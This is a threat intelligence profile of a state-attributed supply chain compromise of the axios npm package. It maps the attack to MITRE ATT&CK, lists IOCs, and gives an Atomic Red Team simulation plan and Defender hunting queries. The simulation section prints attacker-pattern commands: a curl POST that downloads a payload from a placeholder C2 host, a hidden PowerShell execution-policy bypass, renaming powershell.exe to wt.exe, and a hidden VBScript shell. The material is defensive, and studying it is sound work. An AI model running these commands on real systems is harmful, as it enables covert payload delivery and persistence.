---
source_url: https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/
date_ingested: 2026-06-28
date_published: 2026-04-01
threat_actor: Sapphire Sleet
campaign: Axios npm Supply Chain Compromise
attribution_confidence: high
---

# Sapphire Sleet — Axios npm Supply Chain Compromise

## Campaign Overview

| Field | Value |
|---|---|
| Threat Actor | Sapphire Sleet (DPRK state-sponsored) |
| Also Known As | UNC1069, STARDUST CHOLLIMA, Alluring Pisces, BlueNoroff, CageyChameleon, CryptoCore |
| Active Since | March 2020 |
| Attack Date | March 31, 2026 |
| Target Sector | Finance (cryptocurrency, venture capital, blockchain) |
| Target Regions | United States, Asia, Middle East |
| Motivation | Revenue generation via cryptocurrency theft |
| Impact | Cross-platform RAT deployment via poisoned npm package with 70M+ weekly downloads |

On March 31, 2026, Sapphire Sleet published malicious versions of the `axios` npm package (1.14.1 and 0.30.4). These versions injected a fake dependency (`plain-crypto-js@4.2.1`) that silently downloaded a second-stage RAT during `npm install`, targeting Windows, macOS, and Linux developer workstations and CI/CD pipelines.

---

## TTPs — MITRE ATT&CK Mapping

### Initial Access

| ID | Technique | How Used | Confidence |
|---|---|---|---|
| T1195.002 | Supply Chain Compromise: Software Supply Chain | Published malicious axios@1.14.1 and axios@0.30.4 to npm registry with injected `plain-crypto-js@4.2.1` dependency containing a postinstall hook | High |

### Execution

| ID | Technique | How Used | Confidence |
|---|---|---|---|
| T1059.007 | Command and Scripting Interpreter: JavaScript | `setup.js` executed as npm postinstall lifecycle hook; uses runtime string reconstruction to decode C2 details | High |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Windows second-stage RAT (`6202033.ps1`) launched with `-w hidden -ep bypass`; copied PowerShell renamed to `wt.exe` | High |
| T1059.005 | Command and Scripting Interpreter: Visual Basic | VBScript stager (`6202033.vbs`) used to launch hidden PowerShell download | High |
| T1059.002 | Command and Scripting Interpreter: AppleScript | macOS uses AppleScript to download and background-execute native RAT binary silently | High |
| T1059.006 | Command and Scripting Interpreter: Python | Linux payload (`/tmp/ld.py`) launched via `nohup python3` | High |

### Persistence

| ID | Technique | How Used | Confidence |
|---|---|---|---|
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | PowerShell RAT creates `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate` pointing to `%PROGRAMDATA%\system.bat` | High |

### Defense Evasion

| ID | Technique | How Used | Confidence |
|---|---|---|---|
| T1036.003 | Masquerading: Rename System Utilities | PowerShell copied and renamed to `C:\ProgramData\wt.exe` (mimics Windows Terminal); macOS binary named `com.apple.act.mond` to impersonate Apple daemon | High |
| T1027 | Obfuscated Files or Information | `setup.js` uses layered runtime obfuscation to reconstruct module names, platform IDs, file paths, and command templates | High |
| T1140 | Deobfuscate/Decode Files or Information | RAT uses Base64-encoded HTTP POST requests for C2; strings decoded at runtime | High |
| T1070.004 | Indicator Removal: File Deletion | `setup.js` and original `package.json` deleted post-execution; `package.md` renamed to `package.json` to present clean manifest; VBS/PS1 temp files self-delete | High |
| T1564.003 | Hide Artifacts: Hidden Window | VBScript runs `cmd.exe` with hidden window (`cscript //nologo`); PowerShell invoked with `-w hidden` | High |
| T1562.001 | Impair Defenses: Disable or Modify Tools | PowerShell execution policy bypassed via `-ep bypass` flag | Medium |
| T1055 | Process Injection | Windows RAT supports injecting additional binary payloads directly into memory | Medium |

### Discovery

| ID | Technique | How Used | Confidence |
|---|---|---|---|
| T1082 | System Information Discovery | RAT collects OS version, boot time, installed hardware inventory | High |
| T1057 | Process Discovery | RAT enumerates running processes and sends to C2 | High |
| T1083 | File and Directory Discovery | RAT supports remote file and directory enumeration | High |

### Command and Control

| ID | Technique | How Used | Confidence |
|---|---|---|---|
| T1105 | Ingress Tool Transfer | Second-stage RAT downloaded from `hxxp://sfrclak[.]com:8000/6202033` via `curl` POST | High |
| T1571 | Non-Standard Ports | C2 communicates over HTTP port 8000 | High |
| T1132.001 | Data Encoding: Standard Encoding | C2 beacon uses periodic encoded (Base64) HTTP POST requests | High |
| T1102 | Web Service (delivery vector) | Sapphire Sleet historically uses OneDrive/Google Drive for initial malware delivery in spearphishing lures | Medium |

---

## Indicators of Compromise

### Domains
| Indicator | Notes |
|---|---|
| `sfrclak[.]com` | C2 domain; registrar NameCheap; resolves to 142.11.206[.]73 |

### IP Addresses
| Indicator | Notes |
|---|---|
| `142.11.206[.]73` | Sapphire Sleet C2; Hostwinds VPS; port 8000 HTTP |

### URLs
| Indicator | Notes |
|---|---|
| `hxxp://sfrclak[.]com:8000/6202033` | Single static path used by all platform variants |

### File Hashes (SHA-256)
| Hash | Platform | Description |
|---|---|---|
| `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` | macOS | `com.apple.act.mond` — native RAT binary |
| `ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c` | Windows | `6202033.ps1` — PowerShell RAT |
| `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101` | Windows | `6202033.ps1` — variant |
| `f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd` | Windows | `system.bat` — persistence bat |
| `fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf` | Linux | `ld.py` — Python RAT loader |

### File Paths
| Path | Platform | Description |
|---|---|---|
| `%TEMP%\6202033.vbs` | Windows | VBScript dropper (transient, self-deletes) |
| `%TEMP%\6202033.ps1` | Windows | PowerShell RAT (transient, self-deletes) |
| `%PROGRAMDATA%\system.bat` | Windows | Persistent BAT for re-fetching RAT |
| `C:\ProgramData\wt.exe` | Windows | Masqueraded PowerShell binary (durable) |
| `/Library/Caches/com.apple.act.mond` | macOS | Native RAT binary (durable) |
| `/tmp/ld.py` | Linux | Python RAT loader (durable in typical flows) |

### Registry Keys
| Key | Description |
|---|---|
| `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate` | Persistence run key created by PowerShell RAT |

### Malicious npm Packages
| Package | Version | Notes |
|---|---|---|
| `axios` | 1.14.1 | Manifest-only change; adds plain-crypto-js dependency |
| `axios` | 0.30.4 | Manifest-only change; adds plain-crypto-js dependency |
| `plain-crypto-js` | 4.2.1 | Fake crypto library; contains malicious postinstall hook in `setup.js` |

---

## Simulation Plan (Atomic Red Team)

Prioritized by technique confidence and available atomic tests. Run in an isolated lab environment.

### High Priority

**1. Registry Run Key Persistence (T1547.001)**
Simulates the Windows RAT creating its persistence mechanism.
```
Invoke-AtomicTest T1547.001 -TestNumbers 1
# Creates HKCU:\Software\Microsoft\Windows\CurrentVersion\Run with arbitrary value
# Match actor's key name: MicrosoftUpdate
```
Custom variant — set the run key name to `MicrosoftUpdate` pointing to `%PROGRAMDATA%\system.bat`.

---

**2. Rename System Utilities / LOLBin Masquerading (T1036.003)**
Simulates copying PowerShell to `wt.exe` to masquerade as Windows Terminal.
```
Invoke-AtomicTest T1036.003 -TestNumbers 1
# Copy cmd.exe or powershell.exe and rename
```
Custom variant:
```powershell
Copy-Item (Get-Command powershell.exe).Source "$env:ProgramData\wt.exe"
```

---

**3. PowerShell Hidden Window + Execution Policy Bypass (T1059.001 + T1564.003)**
Simulates the actor's PowerShell invocation pattern.
```
Invoke-AtomicTest T1059.001 -TestNumbers 1
Invoke-AtomicTest T1564.003 -TestNumbers 1
```
Custom one-liner matching actor pattern:
```powershell
powershell.exe -w hidden -ep bypass -command "Write-Output 'sim'"
```

---

**4. VBScript Execution (T1059.005)**
Simulates the VBScript stager that launches the hidden PowerShell download.
```
Invoke-AtomicTest T1059.005 -TestNumbers 1
```
Custom variant — write and execute a VBS that invokes `cscript //nologo`:
```vbscript
Dim oShell : Set oShell = CreateObject("WScript.Shell")
oShell.Run "cmd.exe /c whoami > %TEMP%\out.txt", 0, False
```

---

**5. Ingress Tool Transfer via curl (T1105)**
Simulates the cross-platform download pattern used by `setup.js`.
```
Invoke-AtomicTest T1105 -TestNumbers 1
```
Custom variant matching actor's POST pattern:
```bash
curl -s -X POST -d "packages.npm.org/product1" http://[C2]:8000/6202033 -o /tmp/payload
```

---

**6. File Deletion / Indicator Removal (T1070.004)**
Simulates self-deletion of the VBS/PS1 stager after execution.
```
Invoke-AtomicTest T1070.004 -TestNumbers 1
```

---

**7. System Information Discovery (T1082)**
Simulates RAT initial beacon that collects host inventory.
```
Invoke-AtomicTest T1082 -TestNumbers 1
```

---

### Medium Priority

**8. Process Discovery (T1057)**
Simulates RAT enumerating running processes.
```
Invoke-AtomicTest T1057 -TestNumbers 1
```

**9. Python Script Execution (T1059.006)**
Simulates Linux payload launch pattern.
```
Invoke-AtomicTest T1059.006 -TestNumbers 1
```
Custom variant:
```bash
nohup python3 /tmp/ld.py > /dev/null 2>&1 &
```

**10. AppleScript Execution (T1059.002)**
Simulates macOS payload delivery.
```
Invoke-AtomicTest T1059.002 -TestNumbers 1
```

---

### Detection Opportunities

| Technique | Detection Signal |
|---|---|
| T1195.002 | Presence of `plain-crypto-js` in `node_modules`; axios versions 1.14.1 or 0.30.4 in inventory |
| T1547.001 | New `MicrosoftUpdate` value under `HKCU\...\Run`; creation of `%PROGRAMDATA%\system.bat` |
| T1036.003 | `wt.exe` executing from `%PROGRAMDATA%` instead of expected path; signing mismatch |
| T1059.001 | PowerShell spawned by `node.exe`; `-ep bypass` combined with `-w hidden`; parent process is npm/node |
| T1105 | `curl` outbound POST to non-standard port (8000); connection to `sfrclak[.]com` or `142.11.206.73` |
| T1070.004 | `package.json` deleted and replaced within `node_modules/plain-crypto-js` directory |
| T1564.003 | `cscript //nologo` launching hidden windows; VBScript spawning `cmd.exe` |

---

## Hunting Queries (Microsoft Defender XDR)

```kql
// Installed malicious Axios or plain-crypto-js versions
DeviceTvmSoftwareInventory
| where (SoftwareName has "axios" and SoftwareVersion in ("1.14.1.0", "0.30.4.0"))
    or (SoftwareName has "plain-crypto-js" and SoftwareVersion == "4.2.1.0")

// RAT dropper execution
CloudProcessEvents
| where ProcessCurrentWorkingDirectory endswith '/node_modules/plain-crypto-js'
    and (ProcessCommandLine has_all ('plain-crypto-js','node setup.js'))
    or ProcessCommandLine has_all ('/tmp/ld.py','sfrclak.com:8000')

// C2 connection
DeviceNetworkEvents
| where Timestamp > ago(2d)
| where RemoteUrl contains "sfrclak.com"
| where RemotePort == "8000"

// Curl download pattern (all platforms)
DeviceProcessEvents
| where Timestamp > ago(2d)
| where (FileName =~ "cmd.exe" and ProcessCommandLine has_all ("curl -s -X POST -d", "packages.npm.org", "-w hidden -ep", ".ps1", "& del", ":8000"))
   or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "nohup", ".py", ":8000/", "> /dev/null 2>&1") and ProcessCommandLine contains "python")
   or (ProcessCommandLine has_all ("curl", "-d packages.npm.org/", "com.apple.act.mond", "http://",":8000/", "&> /dev/null"))
```
